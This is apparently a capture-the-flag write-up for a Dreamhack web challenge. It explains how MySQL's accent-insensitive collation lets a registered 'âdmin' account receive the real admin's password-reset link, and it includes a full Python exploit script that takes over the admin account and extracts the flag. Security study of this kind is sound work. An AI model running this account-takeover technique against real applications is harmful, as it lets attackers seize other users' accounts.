- Flaw 1: MySQL Unicode Collation Inconsistency
    - Looking at the database initialization script init.sql, the username column is defined without an explicit collation rule:
```
CREATE TABLE IF NOT EXISTS users (
    username VARCHAR(191) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    ...
) ENGINE=InnoDB;
```
   - By default (MySQL 8.0+), the server falls back to the default schema collation: utf8mb4_0900_ai_ci. The ai_ci suffix stands for:
        - ci (Case Insensitive): Ignored upper/lower case variations.
        - ai (Accent Insensitive): Ignores diacritics/accents.
    - The Impact: During a string comparison (WHERE username = ...), MySQL strips off the accents, rendering Unicode characters like â or à identical to their base ASCII character a. Therefore, to MySQL, 'âdmin' == 'admin'. However, Python 3 strictly treats them as two completely separate Unicode objects on the RAM ('âdmin' != 'admin').

- Business Logic Flaw in V2 Password Reset Flow
    - Let's inspect the vulnerable endpoint handling password reset requests for V2 inside app.py:
```
@app.route("/v2/request-password-change", methods=["POST"])
def request_password_change_v2():
    if request.method == "POST":
        # [!] RAW USER INPUT: 'username' holds the exact string typed by the user (e.g., "âdmin")
        username = request.form.get("username", "").strip() 
        
        if db_get_user_by_username(username):
            try:
                # [!] THE LOGIC TRAP: db_get_user_by_username(username) executes a query in MySQL.
                # Due to Accent Insensitivity, MySQL matches it to the real 'admin' row,
                # generating a valid reset token meant for the REAL ADMIN account.
                token = db_create_reset_token(username=db_get_user_by_username(username)['username'], ttl_minutes=TOKEN_TTL_MINUTES)
                reset_path = url_for("password_reset_v2", token=token)
                
                # [🔥] THE FATAL CRACK:
                # Instead of fetching the canonical name from the DB query result, 
                # the code uses the raw attacker-controlled 'username' input ("âdmin") 
                # to route the message into the shared RAM inbox.
                inbox_post(username, f"Password change link: {reset_path} (one-time use)")
```
    - Summary of the Bug: A password reset token is legitimately generated for the real admin account in the database, but the highly sensitive link containing this token gets delivered into the message inbox of the attacker-owned âdmin spoofed mailbox on the RAM.

- Exploit Scenario
    - We can systematically trigger a full 0-click account takeover against the real admin without needing any debugger access:

    - Step 1: Register a spoofed account named âdmin (using the Unicode circumflex â) via the V1 signup page (/v1/signup). Python allows this since the key âdmin does not yet exist in the memory.

    - Step 2: Issue a password reset request for âdmin at the V2 endpoint (/v2/request-password-change). This tricks MySQL into issuing a reset token for the real admin while routing the output path into our spoofed inbox.

    - Step 3: Authenticate into the spoofed âdmin account on V1 and read My Page (/v1/mypage). Extract the secret V2 reset link sent to us.

    - Step 4: Send a raw POST request to that token link to dynamically alter the database password of the legitimate, top-privilege admin account.

    - Step 5: Authenticate as the real admin on V2 using our newly set password, visit My Page, and grab the target flag.
    
`exploit.py`
```
#!/usr/bin/env python3
import re
import requests

# Target Host URL provided by the Dreamhack lab instance
HOST = 'http://host8.dreamhack.games:23341'

# Initialize a persistent session to maintain state cookies
sesh = requests.session()

# The attacker's desired new password for the target administrator account
arb_pw = 'hacked_password_999'
# Unicode payload targeting the Application-Database parser mismatch
fake_user = 'âdmin' 

print("[*] Initiating 0-Click Account Takeover Exploit...")

# Step 1: Register the spoofed account on V1 (In-Memory Array)
print(f"[1] Registering spoofed user '{fake_user}' on V1...")
sesh.post(HOST + '/v1/signup', data={'username': fake_user, 'password': arb_pw})

# Step 2: Fire the vulnerable password reset request on V2 (Triggering MySQL Collation)
print(f"[2] Triggering flawed password reset logic for '{fake_user}' on V2...")
sesh.post(HOST + '/v2/request-password-change', data={'username': fake_user})

# Step 3: Login to the spoofed account on V1 to intercept the leaked link
print(f"[3] Logging into '{fake_user}' on V1 to read inbox...")
sesh.post(HOST + '/v1/login', data={'username': fake_user, 'password': arb_pw})

# Step 4: Extract the Admin reset token via Regular Expressions from HTML
resp = sesh.get(HOST + '/v1/mypage')
try:
    token_url = re.findall(r'/v2/change-password/[^\s"\'>]+', resp.text)[0]
    print(f"[+] Leaked Admin Reset Path Extracted: {token_url}")
except IndexError:
    print("[-] Exploit failed: Token was not found in the target mailbox.")
    exit()

# Step 5: Execute the account takeover via a direct state-changing POST
print("[4] Hijacking session: Forcing password update on the real ADMIN database row...")
sesh.post(HOST + token_url, data={'new_password': arb_pw, 'confirm_password': arb_pw})

# Step 6: Clear local cookies to drop the spoofed session and prevent redirect lockups
print("[5] Purging old session cookies locally to clear the handshake state...")
sesh.cookies.clear() 

# Step 7: Authenticate directly into the legitimate admin account using the hijacked credentials
print("[6] Authenticating as the legitimate ADMIN via V2...")
sesh.post(HOST + '/v2/login', data={'username': 'admin', 'password': arb_pw})

# Step 8: Fetch the final target flag from the real Admin's dashboard
print("[7] Querying Admin dashboard for the final flag state...")
resp = sesh.get(HOST + '/v1/mypage')

# Parse for the flag wrapper pattern DH{...}
flag = re.findall(r"DH\{.*?\}", resp.text)
if flag:
    print(f"\n[🎉] EXPLOIT SUCCESSFUL! Flag: {flag[0]}")
else:
    print("[-] Logged in successfully, but flag pattern was missing on the page.")
```
    